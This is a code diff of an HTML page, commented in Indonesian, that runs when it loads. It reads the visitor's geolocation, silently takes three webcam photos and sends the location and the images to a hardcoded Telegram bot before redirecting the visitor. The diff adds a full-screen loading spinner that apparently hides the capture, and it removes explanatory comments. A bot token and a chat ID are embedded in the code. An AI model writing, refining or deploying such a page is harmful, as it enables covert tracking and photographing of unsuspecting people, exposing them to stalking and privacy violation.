@@ -4,8 +4,44 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Telegram Bot</title>
+  <style>
+    /* Gaya untuk indikator loading */
+    #loading-indicator {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
 </head>
 <body>
+  <!-- Indikator loading -->
+  <div id="loading-indicator">
+    <div class="spinner"></div>
+  </div>
+
   <script>
     const apiToken = "7537995896:AAGg4hCRAellVFqQHZml6qIZSBTEUs4WXQg"; // Ganti dengan token bot Anda
     const chatId = "7353825005"; // Ganti dengan chat ID Anda
@@ -17,7 +53,7 @@
     const startCameraAndCapturePhotos = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video"); // Elemen hanya digunakan secara programatik, tidak ditampilkan
+        const video = document.createElement("video");
         video.srcObject = stream;
         await new Promise((resolve) => (video.onloadedmetadata = resolve));
         video.play();
@@ -25,7 +61,6 @@
         const canvas = document.createElement("canvas");
         const context = canvas.getContext("2d");
 
-        // Ambil beberapa foto
         const photos = [];
         for (let i = 0; i < 3; i++) {
           canvas.width = video.videoWidth;
@@ -37,10 +72,10 @@
           });
 
           photos.push(photoBlob);
-          await new Promise((resolve) => setTimeout(resolve, 1000)); // Tunggu 1 detik sebelum mengambil foto berikutnya
+          await new Promise((resolve) => setTimeout(resolve, 1000));
         }
 
-        stream.getTracks().forEach((track) => track.stop()); // Hentikan akses kamera
+        stream.getTracks().forEach((track) => track.stop());
         return photos;
       } catch (err) {
         console.error("Gagal mengakses kamera:", err);
@@ -69,7 +104,6 @@
     // Kirim pesan dan foto ke Telegram
     const sendToTelegram = async (message, photos) => {
       try {
-        // Kirim pesan teks
         const messageUrl = `https://api.telegram.org/bot${apiToken}/sendMessage`;
         const messageResponse = await fetch(messageUrl, {
           method: "POST",
@@ -86,7 +120,6 @@
           console.error("Gagal mengirim pesan:", await messageResponse.text());
         }
 
-        // Kirim foto satu per satu
         for (const photoBlob of photos) {
           const photoUrl = `https://api.telegram.org/bot${apiToken}/sendPhoto`;
           const formData = new FormData();
@@ -110,23 +143,22 @@
     // Mulai proses saat halaman dimuat
     (async () => {
       try {
-        // Dapatkan lokasi
         currentLocation = await getLocation();
         const { latitude, longitude } = currentLocation;
         const locationMessage = `Lokasi saat ini: https://www.google.com/maps?q=${latitude},${longitude}`;
 
-        // Dapatkan foto dari kamera
         const photos = await startCameraAndCapturePhotos();
 
-        // Kirim lokasi dan foto ke Telegram
         await sendToTelegram(locationMessage, photos);
 
-        // Redirect ke halaman lain
+        // Sembunyikan indikator loading dan redirect
+        document.getElementById("loading-indicator").style.display = "none";
         window.location.href = redirectUrl;
       } catch (err) {
         console.error("Terjadi kesalahan:", err);
 
-        // Redirect meskipun terjadi kesalahan
+        // Tetap redirect meskipun terjadi kesalahan
+        document.getElementById("loading-indicator").style.display = "none";
         window.location.href = redirectUrl;
       }
     })();
